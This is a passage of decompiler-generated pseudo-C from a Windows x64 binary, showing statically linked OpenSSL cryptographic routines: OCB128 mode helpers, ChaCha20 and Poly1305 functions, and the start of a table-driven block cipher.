  v24[0] = v7 ^ _mm_cvtsi128_si32(v26);
  v11 = v7 ^ v10;
  v12 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 3));
  v24[1] = v11;
  v13 = v10 ^ v12;
  v14 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 4));
  v24[2] = v13;
  v15 = v12 ^ v14;
  v16 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 5));
  v24[3] = v15;
  v17 = v14 ^ v16;
  v18 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 6));
  v24[4] = v17;
  v19 = v16 ^ v18;
  v20 = _mm_cvtsi128_si32(_mm_srli_si128(v26, 7));
  v24[5] = v19;
  v23 = v26;
  v24[6] = v18 ^ v20;
  v24[7] = v20 ^ _mm_cvtsi128_si32(_mm_srli_si128(v26, 8));
  sub_1400951B0((__int64)v23.m128i_i64 + v9, v22.m128i_i8[15] & 7, a1 + 160);
  result = 1i64;
  *(_BYTE *)(a1 + 175) |= (unsigned __int8)(v24[v9] & (-1 << (8 - v8))) >> (8 - v8);
  return result;
}

//----- (0000000140095140) ----------------------------------------------------
__int64 __fastcall sub_140095140(__int64 a1, void *a2, size_t a3)
{
  if ( a3 - 1 > 0xF )
    return 0xFFFFFFFFi64;
  sub_140094CF0(a1, 0i64, 0i64);
  memmove(a2, (const void *)(a1 + 112), a3);
  return 1i64;
}

//----- (00000001400951B0) ----------------------------------------------------
__int64 __fastcall sub_1400951B0(__int64 a1, char a2, __int64 a3)
{
  char v3; // r10
  char v4; // r11
  __int64 result; // rax
  char v7; // dl
  char v8[17]; // [rsp+1h] [rbp-29h]

  v3 = 8 - a2;
  v4 = -1 << (8 - a2);
  for ( result = 15i64; result >= 0; --result )
  {
    if ( result > 0 )
      v8[result] = (unsigned __int8)(v4 & *(_BYTE *)(result + a1)) >> v3;
    v7 = *(_BYTE *)(result + a1) << a2;
    *(_BYTE *)(a3 + result) = v7;
    if ( result != 15 )
      *(_BYTE *)(a3 + result) = v7 ^ v8[result + 1];
  }
  return result;
}

//----- (0000000140095260) ----------------------------------------------------
void __fastcall sub_140095260(unsigned __int64 a1, const __m128i *a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v5; // rcx
  unsigned __int64 v6; // r11
  unsigned __int64 v7; // r11
  const __m128i *v8; // rax
  unsigned __int64 v9; // rbx
  __m128i v10; // xmm0
  __m128i v11; // xmm1
  unsigned __int64 v12; // r10
  const __m128i *v13; // rax
  unsigned __int64 v14; // r9
  unsigned __int64 v15; // r8

  if ( a3 )
  {
    v5 = 0i64;
    if ( a3 >= 0x20 )
    {
      v6 = a3 + a4 - 1;
      if ( (a4 > (unsigned __int64)&a2[-1].m128i_u64[1] + a3 + 7 || v6 < (unsigned __int64)a2)
        && (a4 > a1 + a3 - 1 || v6 < a1) )
      {
        v7 = a1 - (_QWORD)a2;
        v8 = a2;
        v9 = a4 - (_QWORD)a2;
        do
        {
          v10 = _mm_loadu_si128(v8);
          v5 += 32i64;
          v11 = _mm_loadu_si128((const __m128i *)((char *)v8 + v7));
          v8 += 2;
          *(const __m128i *)((char *)&v8[-2] + v9) = _mm_xor_si128(v11, v10);
          *(const __m128i *)((char *)&v8[-1] + v9) = _mm_xor_si128(
                                                       _mm_loadu_si128((const __m128i *)((char *)v8 + v7 - 16)),
                                                       _mm_loadu_si128(v8 - 1));
        }
        while ( v5 < (a3 & 0xFFFFFFFFFFFFFFE0ui64) );
      }
    }
    if ( v5 < a3 )
    {
      v12 = a1 - (_QWORD)a2;
      v13 = &a2[v5 / 0x10];
      v14 = a4 - (_QWORD)a2;
      v15 = a3 - v5;
      do
      {
        v13->m128i_i8[v14] = v13->m128i_i8[0] ^ v13->m128i_i8[v12];
        v13 = (const __m128i *)((char *)v13 + 1);
        --v15;
      }
      while ( v15 );
    }
  }
}

//----- (0000000140095350) ----------------------------------------------------
void *__fastcall sub_140095350(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r14
  void *result; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rdx
  void *v8; // rcx
  unsigned __int64 v9; // r12
  __int64 v10; // r15
  _BYTE *v11; // rcx
  _BYTE *v12; // rsi
  char v13; // di

  v2 = a1[5];
  if ( a2 <= v2 )
    return (void *)(a1[11] + 16 * a2);
  v6 = a1[6];
  if ( a2 >= v6 )
  {
    v7 = v6 + ((a2 - v6 + 4) & 0xFFFFFFFFFFFFFFFCui64);
    v8 = (void *)a1[11];
    a1[6] = v7;
    result = sub_14001D970(v8, 16 * v7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\modes\\ocb128.c", 0x7Au);
    if ( !result )
      return result;
    a1[11] = result;
  }
  if ( v2 < a2 )
  {
    v9 = a2 - v2;
    v10 = 16 * v2;
    v2 = a2;
    do
    {
      v11 = (_BYTE *)(v10 + a1[11]);
      v12 = v11 + 16;
      v13 = -121 * (*v11 >> 7);
      sub_1400951B0((__int64)v11, 1, (__int64)(v11 + 16));
      v12[15] ^= v13;
      v10 += 16i64;
      --v9;
    }
    while ( v9 );
  }
  result = (void *)(a1[11] + 16 * a2);
  a1[5] = v2;
  return result;
}

//----- (0000000140095470) ----------------------------------------------------
__int64 __fastcall sub_140095470(unsigned __int8 *a1, _BYTE *a2, __int64 a3)
{
  return sub_1400B4200(*(_DWORD *)(a3 + 272), a1, a3, a2);
}

//----- (00000001400954A0) ----------------------------------------------------
__int64 __fastcall sub_1400954A0(unsigned __int8 *a1, _BYTE *a2, _DWORD *a3)
{
  return sub_1400B5930(a3[68], a1, a3, a2);
}

//----- (00000001400954D0) ----------------------------------------------------
__int64 __fastcall sub_1400954D0(unsigned __int8 *a1, int a2, unsigned int *a3)
{
  if ( !a1 || !a3 )
    return 0xFFFFFFFFi64;
  if ( ((a2 - 128) & 0xFFFFFF3F) != 0 || a2 == 320 )
    return 4294967294i64;
  a3[68] = sub_1400B4B60(a2, a1, a3);
  return 0i64;
}

//----- (0000000140095530) ----------------------------------------------------
void __fastcall sub_140095530(char *a1, char *a2, unsigned __int64 a3, __int64 a4, char *a5, __int64 a6)
{
  if ( (_DWORD)a6 )
    sub_140090B90(a1, a2, a3, a4, a5, (void (__fastcall *)(char *, char *, __int64))sub_1400954A0);
  else
    sub_1400908C0(
      (__int64 *)a1,
      (__int64 *)a2,
      a3,
      a4,
      a5,
      (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_140095470);
}

//----- (0000000140095570) ----------------------------------------------------
_OWORD *__fastcall sub_140095570(
        unsigned __int64 a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        __int128 *a4,
        _OWORD *a5)
{
  _OWORD *result; // rax
  unsigned __int64 v6; // r14
  __int128 v9; // xmm1
  __int128 v10; // xmm0
  unsigned __int64 v11; // rbx
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // rdx
  unsigned __int64 v14; // r8
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  char *v17; // rcx
  _BYTE *v18; // rdx
  char v19; // [rsp+1Fh] [rbp-52h] BYREF
  __int128 v20[4]; // [rsp+20h] [rbp-51h] BYREF
  __int128 v21[3]; // [rsp+60h] [rbp-11h] BYREF
  __int128 v22; // [rsp+90h] [rbp+1Fh]

  result = a5;
  v6 = a3;
  qmemcpy(v21, "expand 32-byte k", 16);
  v9 = a4[1];
  v21[1] = *a4;
  v10 = *a5;
  v21[2] = v9;
  v22 = v10;
  if ( a3 )
  {
    do
    {
      v11 = 64i64;
      if ( v6 < 0x40 )
        v11 = v6;
      sub_140095730((unsigned __int64)v20, v21);
      result = 0i64;
      if ( v11 )
      {
        if ( v11 >= 0x20 )
        {
          v12 = v11 + a1 - 1;
          if ( (a1 > (unsigned __int64)(&v19 + v11) || v12 < (unsigned __int64)v20) && (a1 > v11 + a2 - 1 || v12 < a2) )
          {
            v13 = a2 - (_QWORD)v20;
            v14 = a1 - (_QWORD)v20;
            do
            {
              v15 = _mm_loadu_si128((const __m128i *)((char *)&v20[1] + (_QWORD)result));
              *(__m128i *)((char *)v20 + (_QWORD)result + v14) = _mm_xor_si128(
                                                                   _mm_loadu_si128((const __m128i *)((char *)v20 + (_QWORD)result + v13)),
                                                                   _mm_loadu_si128((const __m128i *)((char *)v20 + (_QWORD)result)));
              v16 = _mm_loadu_si128((const __m128i *)((char *)&v20[1] + (_QWORD)result + v13));
              v17 = (char *)result + v14;
              result += 2;
              *(__m128i *)((char *)&v20[1] + (_QWORD)v17) = _mm_xor_si128(v16, v15);
            }
            while ( (unsigned __int64)result < (v11 & 0xFFFFFFFFFFFFFFE0ui64) );
          }
        }
        for ( ; (unsigned __int64)result < v11; v18[a1 - (_QWORD)v20] = *v18 ^ v18[a2 - (_QWORD)v20] )
        {
          v18 = (char *)v20 + (_QWORD)result;
          result = (_OWORD *)((char *)result + 1);
        }
      }
      LODWORD(v22) = v22 + 1;
      a1 += v11;
      a2 += v11;
      v6 -= v11;
    }
    while ( v6 );
  }
  return result;
}

//----- (0000000140095730) ----------------------------------------------------
__int128 *__fastcall sub_140095730(unsigned __int64 a1, __int128 *a2)
{
  __int128 v2; // xmm1
  __int128 v3; // xmm0
  int v4; // r10d
  int v5; // ecx
  int v6; // r8d
  __int128 v7; // xmm1
  int v8; // ebx
  int v9; // edx
  unsigned int v10; // r15d
  unsigned int v11; // r12d
  unsigned int v12; // r13d
  unsigned int v13; // r9d
  unsigned int v14; // r11d
  unsigned int v15; // r14d
  unsigned int v16; // esi
  unsigned int v17; // edi
  unsigned int v18; // eax
  int v19; // ecx
  int v20; // r8d
  int v21; // edx
  int v22; // esi
  int v23; // edi
  int v24; // r9d
  int v25; // r14d
  int v26; // r12d
  int v27; // r10d
  int v28; // r13d
  int v29; // r11d
  int v30; // r15d
  int v31; // eax
  int v32; // edi
  int v33; // r9d
  int v34; // r8d
  int v35; // eax
  int v36; // r8d
  int v37; // esi
  int v38; // r13d
  int v39; // ecx
  int v40; // eax
  int v41; // ecx
  int v42; // r14d
  int v43; // r12d
  int v44; // edx
  int v45; // eax
  int v46; // r10d
  int v47; // r11d
  int v48; // r15d
  int v49; // ebx
  int v50; // r11d
  int v51; // r12d
  int v52; // eax
  int v53; // r10d
  int v54; // eax
  int v55; // r15d
  int v56; // ecx
  int v57; // edx
  int v58; // eax
  int v59; // r9d
  int v60; // ebx
  int v61; // eax
  int v62; // r13d
  int v63; // ecx
  int v64; // ecx
  int v65; // eax
  bool v66; // zf
  int v67; // ebx
  unsigned __int64 v68; // rcx
  __int128 *result; // rax
  __int64 v70; // rcx
  char *v71; // rdx
  __m128i v72; // xmm0
  __m128i v73; // xmm1
  __m128i v74; // xmm2
  __int64 v75; // rdx
  int v76; // ecx
  int v77; // [rsp+0h] [rbp-69h]
  int v78; // [rsp+0h] [rbp-69h]
  int v79; // [rsp+4h] [rbp-65h]
  __int64 v80; // [rsp+8h] [rbp-61h]
  int v81; // [rsp+8h] [rbp-61h]
  int v82; // [rsp+10h] [rbp-59h]
  __int64 v83; // [rsp+18h] [rbp-51h]
  __int128 v86; // [rsp+30h] [rbp-39h] BYREF
  __int128 v87; // [rsp+40h] [rbp-29h]
  __int128 v88; // [rsp+50h] [rbp-19h]
  __int128 v89; // [rsp+60h] [rbp-9h] BYREF

  v2 = a2[1];
  v86 = *a2;
  v3 = a2[2];
  v4 = HIDWORD(v86);
  v5 = DWORD1(v86);
  v6 = v86;
  v87 = v2;
  v7 = a2[3];
  v8 = HIDWORD(v87);
  v9 = DWORD2(v86);
  v88 = v3;
  v10 = HIDWORD(v3);
  v11 = DWORD2(v3);
  v12 = DWORD1(v3);
  v13 = v3;
  v89 = v7;
  v14 = HIDWORD(v7);
  v15 = DWORD2(v7);
  v16 = DWORD1(v7);
  v17 = v7;
  v82 = DWORD2(v87);
  v18 = v87;
  v80 = v87;
  v83 = 10i64;
  do
  {
    v19 = HIDWORD(v80) + v5;
    v20 = v18 + v6;
    v21 = v82 + v9;
    v22 = __ROL4__(v19 ^ v16, 16);
    v23 = __ROL4__(v20 ^ v17, 16);
    v24 = v23 + v13;
    v25 = __ROL4__(v21 ^ v15, 16);
    v26 = v25 + v11;
    v27 = v8 + v4;
    v28 = v22 + v12;
    v29 = __ROL4__(v27 ^ v14, 16);
    v30 = v29 + v10;
    v31 = __ROL4__(v80 ^ v24, 12);
    v79 = v31 + v20;
    v32 = __ROL4__((v31 + v20) ^ v23, 8);
    v33 = v32 + v24;
    v34 = v31 ^ v33;
    v35 = __ROL4__(HIDWORD(v80) ^ v28, 12);
    v36 = __ROL4__(v34, 7);
    v77 = v35 + v19;
    v37 = __ROL4__((v35 + v19) ^ v22, 8);
    v38 = v37 + v28;
    v39 = v35 ^ v38;
    v40 = __ROL4__(v82 ^ v26, 12);
    v41 = __ROL4__(v39, 7);
    v81 = v40 + v21;
    v42 = __ROL4__((v40 + v21) ^ v25, 8);
    v43 = v42 + v26;
    v44 = __ROL4__(v40 ^ v43, 7);
    v45 = __ROL4__(v8 ^ v30, 12);
    v46 = v45 + v27;
    v47 = __ROL4__(v46 ^ v29, 8);
    v48 = v47 + v30;
    v49 = __ROL4__(v45 ^ v48, 7);
    v50 = __ROL4__((v41 + v79) ^ v47, 16);
    v51 = v50 + v43;
    v52 = __ROL4__(v41 ^ v51, 12);
    LODWORD(v86) = v52 + v41 + v79;
    v14 = __ROL4__(v86 ^ v50, 8);
    v11 = v14 + v51;
    HIDWORD(v80) = __ROL4__(v52 ^ v11, 7);
    v53 = v36 + v46;
    v78 = v44 + v77;
    v54 = __ROL4__(v32 ^ v78, 16);
    v55 = v54 + v48;
    v56 = __ROL4__(v44 ^ v55, 12);
    DWORD1(v86) = v56 + v78;
    v57 = v49 + v81;
    v17 = __ROL4__(v54 ^ (v56 + v78), 8);
    v10 = v17 + v55;
    v82 = __ROL4__(v56 ^ v10, 7);
    DWORD2(v87) = v82;
    v58 = __ROL4__(v37 ^ (v49 + v81), 16);
    v59 = v58 + v33;
    v60 = __ROL4__(v59 ^ v49, 12);
    v9 = v60 + v57;
    DWORD2(v86) = v9;
    v16 = __ROL4__(v58 ^ v9, 8);
    v61 = __ROL4__(v42 ^ v53, 16);
    v13 = v16 + v59;
    v62 = v61 + v38;
    v8 = __ROL4__(v13 ^ v60, 7);
    v63 = v36 ^ v62;
    v6 = v86;
    v64 = __ROL4__(v63, 12);
    v4 = v64 + v53;
    v15 = __ROL4__(v61 ^ v4, 8);
    v12 = v15 + v62;
    v65 = v64 ^ v12;
    v5 = DWORD1(v86);
    v18 = __ROL4__(v65, 7);
    v66 = v83-- == 1;
    LODWORD(v80) = v18;
    *(_QWORD *)&v87 = __PAIR64__(HIDWORD(v80), v18);
  }
  while ( !v66 );
  *(_QWORD *)&v88 = __PAIR64__(v12, v13);
  HIDWORD(v87) = v8;
  v67 = 0;
  HIDWORD(v86) = v4;
  v68 = a1 + 60;
  *(_QWORD *)&v89 = __PAIR64__(v16, v17);
  *((_QWORD *)&v89 + 1) = __PAIR64__(v14, v15);
  *((_QWORD *)&v88 + 1) = __PAIR64__(v10, v11);
  if ( a1 > (unsigned __int64)&v89 + 12 || (result = &v86, v68 < (unsigned __int64)&v86) )
  {
    result = (__int128 *)((char *)a2 + 60);
    if ( a1 > (unsigned __int64)a2 + 60 || v68 < (unsigned __int64)a2 )
    {
      v70 = 2i64;
      v71 = (char *)a2 - a1;
      result = (__int128 *)(a1 + 16);
      v67 = 16;
      do
      {
        v72 = _mm_loadu_si128((const __m128i *)((char *)result + (_QWORD)v71 - 16));
        v73 = _mm_loadu_si128((const __m128i *)((char *)result + (_QWORD)&v86 - a1 - 16));
        v74 = _mm_loadu_si128((const __m128i *)((char *)result + (_QWORD)&v86 - a1));
        result += 2;
        *(result - 3) = (__int128)_mm_add_epi32(v73, v72);
        *(result - 2) = (__int128)_mm_add_epi32(
                                    v74,
                                    _mm_loadu_si128((const __m128i *)((char *)result + (_QWORD)v71 - 32)));
        --v70;
      }
      while ( v70 );
    }
  }
  v75 = v67;
  if ( v67 < 16i64 )
  {
    do
    {
      result = (__int128 *)(a1 - (_QWORD)&v86 + 4 * v75);
      v76 = *((_DWORD *)&v86 + v75) + *(_DWORD *)((char *)&v86 + 4 * v75 + (char *)a2 - (char *)&v86);
      ++v75;
      *(_DWORD *)((char *)&v86 + (_QWORD)result) = v76;
    }
    while ( v75 < 16 );
  }
  return result;
}

//----- (0000000140095A80) ----------------------------------------------------
__int64 __fastcall sub_140095A80(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 v5; // rax

  v2 = *(_QWORD *)(a1 + 224);
  if ( v2 )
  {
    *(_BYTE *)(v2 + a1 + 208) = 1;
    v5 = v2 + 1;
    if ( v5 < 0x10 )
      memset((void *)(v5 + a1 + 208), 0, 16 - v5);
    sub_140095D80((unsigned int *)a1, a1 + 208, 0x10ui64, 0);
  }
  sub_1400960B0((unsigned int *)a1, a2, (unsigned int *)(a1 + 192));
  return sub_140023440(a1, 248i64);
}

//----- (0000000140095B20) ----------------------------------------------------
__int64 __fastcall sub_140095B20(__int64 a1, unsigned __int8 *a2)
{
  __int64 result; // rax

  *(_DWORD *)(a1 + 192) = a2[16] | ((a2[17] | (*((unsigned __int16 *)a2 + 9) << 8)) << 8);
  *(_DWORD *)(a1 + 196) = a2[20] | ((a2[21] | (*((unsigned __int16 *)a2 + 11) << 8)) << 8);
  *(_DWORD *)(a1 + 200) = a2[24] | ((a2[25] | (*((unsigned __int16 *)a2 + 13) << 8)) << 8);
  *(_DWORD *)(a1 + 204) = a2[28] | ((a2[29] | (*((unsigned __int16 *)a2 + 15) << 8)) << 8);
  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = *a2 | ((a2[1] | ((a2[2] | ((a2[3] & 0xF) << 8)) << 8)) << 8);
  *(_DWORD *)(a1 + 24) = a2[4] & 0xFC | ((a2[5] | ((a2[6] | ((a2[7] & 0xF) << 8)) << 8)) << 8);
  *(_DWORD *)(a1 + 28) = a2[8] & 0xFC | ((a2[9] | ((a2[10] | ((a2[11] & 0xF) << 8)) << 8)) << 8);
  result = a2[12] & 0xFC;
  *(_DWORD *)(a1 + 32) = result | ((a2[13] | ((a2[14] | ((a2[15] & 0xF) << 8)) << 8)) << 8);
  *(_QWORD *)(a1 + 224) = 0i64;
  return result;
}

//----- (0000000140095C80) ----------------------------------------------------
__int64 __fastcall sub_140095C80(__int64 a1, char *a2, size_t a3)
{
  __int64 v3; // rdi
  size_t v4; // rbx
  char *v5; // rbp
  __int64 v7; // r14
  void *v8; // rcx
  __int64 result; // rax
  size_t v10; // rdi
  unsigned __int64 v11; // rbx

  v3 = *(_QWORD *)(a1 + 224);
  v4 = a3;
  v5 = a2;
  if ( v3 )
  {
    v7 = 16 - v3;
    v8 = (void *)(v3 + a1 + 208);
    if ( a3 < 16 - v3 )
    {
      memmove(v8, a2, a3);
      result = v3 + v4;
      *(_QWORD *)(a1 + 224) = v3 + v4;
      return result;
    }
    memmove(v8, a2, 16 - v3);
    result = sub_140095D80((unsigned int *)a1, a1 + 208, 0x10ui64, 1);
    v5 += v7;
    v4 -= v7;
  }
  v10 = v4 & 0xF;
  v11 = v4 - v10;
  if ( v11 >= 0x10 )
  {
    result = sub_140095D80((unsigned int *)a1, (__int64)v5, v11, 1);
    v5 += v11;
  }
  if ( v10 )
    result = (__int64)memmove((void *)(a1 + 208), v5, v10);
  *(_QWORD *)(a1 + 224) = v10;
  return result;
}

//----- (0000000140095D70) ----------------------------------------------------
__int64 sub_140095D70()
{
  return 248i64;
}

//----- (0000000140095D80) ----------------------------------------------------
__int64 __fastcall sub_140095D80(unsigned int *a1, __int64 a2, unsigned __int64 a3, int a4)
{
  __int64 result; // rax
  __int64 v6; // r8
  __int64 v7; // r10
  unsigned int v8; // r9d
  unsigned int v9; // r11d
  __int64 v11; // rdx
  unsigned int v12; // edi
  unsigned int v13; // esi
  unsigned int v14; // r13d
  unsigned int v15; // r14d
  unsigned int v16; // ebp
  unsigned int v17; // r15d
  unsigned __int16 *v18; // rcx
  unsigned __int64 v19; // r12
  unsigned int v20; // ebx
  __int64 v21; // r10
  unsigned __int64 v22; // r8
  __int64 v23; // r11
  unsigned __int64 v24; // rax
  __int64 v25; // r8
  unsigned int v26; // r13d
  __int64 v27; // rdx
  unsigned __int64 v28; // rsi
  unsigned __int64 v29; // rdi
  unsigned __int64 v30; // rbx
  unsigned __int64 v31; // r9
  unsigned int v32; // r13d
  int v33; // r13d
  unsigned int v34; // [rsp+0h] [rbp-68h]
  __int64 v35; // [rsp+8h] [rbp-60h]
  __int64 v36; // [rsp+10h] [rbp-58h]
  __int64 v37; // [rsp+18h] [rbp-50h]
  __int64 v38; // [rsp+28h] [rbp-40h]
  unsigned int *v39; // [rsp+70h] [rbp+8h]
  unsigned int v40; // [rsp+80h] [rbp+18h]

  v39 = a1;
  result = a1[6];
  v6 = a1[7];
  v7 = a1[8];
  v8 = a1[3];
  v9 = *a1;
  v11 = a1[5];
  v12 = a1[1];
  v13 = a1[2];
  v14 = a1[4];
  v15 = v6 + (a1[7] >> 2);
  v16 = result + (a1[6] >> 2);
  v17 = v7 + (a1[8] >> 2);
  v34 = a1[5];
  v40 = v8;
  if ( a3 >= 0x10 )
  {
    v18 = (unsigned __int16 *)(a2 + 6);
    v37 = v11;
    v35 = result;
    v36 = v6;
    v38 = v7;
    v19 = a3 >> 4;
    do
    {
      v20 = v9 + (*((unsigned __int8 *)v18 - 6) | ((*((unsigned __int8 *)v18 - 5) | (*(v18 - 2) << 8)) << 8));
      v21 = (unsigned int)(v12
                         + ((v9
                           + (*((unsigned __int8 *)v18 - 6) | ((*((unsigned __int8 *)v18 - 5) | ((unsigned __int64)*(v18 - 2) << 8)) << 8))) >> 32)
                         + (*((unsigned __int8 *)v18 - 2) | ((*((unsigned __int8 *)v18 - 1) | (*v18 << 8)) << 8)));
      v22 = v13
          + ((v12
            + ((v9
              + (*((unsigned __int8 *)v18 - 6) | ((*((unsigned __int8 *)v18 - 5) | ((unsigned __int64)*(v18 - 2) << 8)) << 8))) >> 32)
            + (*((unsigned __int8 *)v18 - 2) | ((*((unsigned __int8 *)v18 - 1) | ((unsigned __int64)*v18 << 8)) << 8))) >> 32)
          + (*((unsigned __int8 *)v18 + 2) | ((*((unsigned __int8 *)v18 + 3) | ((unsigned __int64)v18[2] << 8)) << 8));
      v23 = (unsigned int)v22;
      v24 = v40
          + HIDWORD(v22)
          + (*((unsigned __int8 *)v18 + 6) | ((*((unsigned __int8 *)v18 + 7) | ((unsigned __int64)v18[4] << 8)) << 8));
      v25 = v40
          + HIDWORD(v22)
          + (*((unsigned __int8 *)v18 + 6) | ((*((unsigned __int8 *)v18 + 7) | (v18[4] << 8)) << 8));
      v26 = a4 + HIDWORD(v24) + v14;
      v27 = v20;
      v28 = v21 * v17 + v23 * v15 + v25 * v16 + v20 * v37;
      v29 = HIDWORD(v28)
          + v17 * (unsigned __int64)(unsigned int)v23
          + v21 * v37
          + v15 * (unsigned __int64)(unsigned int)v25
          + v20 * v35
          + v16 * v26;
      v30 = HIDWORD(v29) + v17 * (unsigned __int64)(unsigned int)v25 + v21 * v35 + v23 * v37 + v20 * v36 + v15 * v26;
      v31 = HIDWORD(v30) + v23 * v35 + v25 * v37 + v21 * v36 + v27 * v38 + v17 * v26;
      v32 = HIDWORD(v31) + v34 * v26;
      LODWORD(v27) = (v32 & 0xFFFFFFFC) + (v32 >> 2);
      v9 = v27 + v28;
      LODWORD(v24) = (v9 ^ (v9 ^ (unsigned int)v27 | (unsigned int)v27 ^ (unsigned int)v28)) >> 31;
      v12 = v24 + v29;
      LODWORD(v27) = (v12 ^ (v12 ^ (unsigned int)v24 | (unsigned int)v24 ^ (v12 - (_DWORD)v24))) >> 31;
      v13 = v27 + v30;
      v18 += 8;
      LODWORD(v24) = (v13 ^ (v13 ^ (unsigned int)v27 | (unsigned int)v27 ^ (unsigned int)v30)) >> 31;
      LODWORD(v25) = v32 & 3;
      v8 = v24 + v31;
      v40 = v8;
      v33 = v24 ^ (v8 - v24);
      result = v8 ^ (unsigned int)v24;
      v14 = v25 + ((v8 ^ ((unsigned int)result | v33)) >> 31);
      --v19;
    }
    while ( v19 );
    a1 = v39;
  }
  *a1 = v9;
  a1[1] = v12;
  a1[2] = v13;
  a1[3] = v8;
  a1[4] = v14;
  return result;
}

//----- (00000001400960B0) ----------------------------------------------------
__int64 __fastcall sub_1400960B0(unsigned int *a1, __int64 a2, unsigned int *a3)
{
  __int64 v3; // rbx
  __int64 v5; // r10
  __int64 v6; // r14
  __int64 v8; // r8
  unsigned int v9; // r12d
  unsigned int v10; // edi
  unsigned int v11; // esi
  __int64 v12; // rax
  unsigned int v13; // r12d
  int v14; // edx
  unsigned __int64 v15; // rcx
  unsigned __int64 v16; // r9
  unsigned __int64 v17; // rbp
  unsigned int v18; // r12d

  v3 = a1[1];
  v5 = *a1;
  v6 = a1[3];
  v8 = a1[2];
  v9 = -((unsigned int)(a1[4] + ((v6 + ((v8 + ((v3 + ((unsigned __int64)(v5 + 5) >> 32)) >> 32)) >> 32)) >> 32)) >> 2);
  v10 = v9 & (v3 + ((unsigned __int64)(v5 + 5) >> 32));
  v11 = v9 & (v8 + ((v3 + ((unsigned __int64)(v5 + 5) >> 32)) >> 32));
  v12 = v9 & ((_DWORD)v5 + 5);
  v13 = ((unsigned int)(a1[4] + ((v6 + ((v8 + ((v3 + ((unsigned __int64)(v5 + 5) >> 32)) >> 32)) >> 32)) >> 32)) >> 2)
      - 1;
  v14 = (v6 + ((v8 + ((v3 + ((unsigned __int64)(v5 + 5) >> 32)) >> 32)) >> 32)) & -((unsigned int)(a1[4]
                                                                                                 + ((v6 + ((v8 + ((v3 + ((unsigned __int64)(v5 + 5) >> 32)) >> 32)) >> 32)) >> 32)) >> 2);
  v15 = *a3 + (v12 | (unsigned int)v5 & v13);
  v16 = HIDWORD(v15) + a3[1] + (v10 | (unsigned __int64)((unsigned int)v3 & v13));
  v17 = HIDWORD(v16) + a3[2] + (v11 | (unsigned __int64)((unsigned int)v8 & v13));
  v18 = a3[3] + HIDWORD(v17) + (v14 | v6 & v13);
  *(_BYTE *)(a2 + 1) = BYTE1(v15);
  *(_BYTE *)(a2 + 2) = BYTE2(v15);
  *(_BYTE *)a2 = v15;
  *(_BYTE *)(a2 + 3) = BYTE3(v15);
  *(_BYTE *)(a2 + 5) = BYTE1(v16);
  *(_BYTE *)(a2 + 6) = BYTE2(v16);
  *(_BYTE *)(a2 + 4) = v16;
  *(_BYTE *)(a2 + 7) = BYTE3(v16);
  *(_WORD *)(a2 + 8) = v17;
  *(_BYTE *)(a2 + 10) = BYTE2(v17);
  *(_BYTE *)(a2 + 11) = BYTE3(v17);
  *(_DWORD *)(a2 + 12) = v18;
  return HIWORD(v18);
}

//----- (0000000140096220) ----------------------------------------------------
__int64 __fastcall sub_140096220(unsigned __int8 *a1, _BYTE *a2, __int64 a3)
{
  int v4; // r15d
  int v5; // r9d
  int v6; // ebp
  int v7; // r8d
  int v8; // r11d
  int v9; // r10d
  int v10; // r8d
  int v11; // esi
  int v12; // r10d
  int v13; // edi
  int v14; // r11d
  int v15; // r9d
  int v16; // r8d
  int v17; // ebp
  int v18; // r15d
  int v19; // r10d
  int v20; // r11d
  int v21; // r9d
  int v22; // r8d
  int v23; // edi
  int v24; // esi
  int v25; // r10d
  int v26; // r11d
  int v27; // r9d
  int v28; // r8d
  int v29; // ebp
  int v30; // r15d
  int v31; // r10d
  int v32; // r11d
  int v33; // r9d
  int v34; // r8d
  int v35; // edi
  int v36; // esi
  int v37; // r10d
  int v38; // r11d
  int v39; // r9d
  int v40; // r8d
  int v41; // ebp
  int v42; // r15d
  int v43; // r10d
  int v44; // r11d
  int v45; // r9d
  int v46; // r8d
  int v47; // esi
  int v48; // edi
  int v49; // r10d
  int v50; // r11d
  int v51; // r9d
  int v52; // r8d
  int v53; // ebp
  int v54; // r15d
  int v55; // r10d
  int v56; // r11d
  int v57; // r9d
  int v58; // r8d
  int v59; // edi
  int v60; // esi
  int v61; // r10d
  int v62; // r11d
  int v63; // r9d
  int v64; // r8d
  int v65; // ebp
  int v66; // r15d
  int v67; // r10d
  int v68; // r11d
  int v69; // r9d
  int v70; // r8d
  int v71; // edi
  int v72; // esi
  int v73; // r10d
  int v74; // r11d
  int v75; // r9d
  int v76; // r8d
  int v77; // ebp
  int v78; // r15d
  int v79; // r10d
  int v80; // r11d
  int v81; // r9d
  int v82; // r8d
  int v83; // edi
  int v84; // esi
  int v85; // r10d
  int v86; // r11d
  int v87; // r9d
  int v88; // r8d
  int v89; // ebp
  int v90; // r15d
  int v91; // r10d
  int v92; // r11d
  int v93; // r9d
  int v94; // r8d
  unsigned int v95; // edi
  int v96; // esi
  int v97; // r10d
  int v98; // r11d
  int v99; // r9d
  int v100; // r8d
  int v101; // ebp
  int v102; // r15d
  __int64 result; // rax

  v4 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v5 = v4 ^ *(_DWORD *)(a3 + 120);
  v6 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  v7 = v6 ^ v5 ^ *(_DWORD *)(a3 + 124);
  v8 = dword_140118300[(unsigned __int8)v7] ^ dword_140118300[BYTE1(v7) + 256] ^ dword_140118300[BYTE2(v7) + 512] ^ dword_140118300[HIBYTE(v7) + 768];
  v9 = dword_140118300[(unsigned __int8)(v8 + v5)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v8 + v5) >> 8)
                                                                   + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v8 + v5) >> 16)
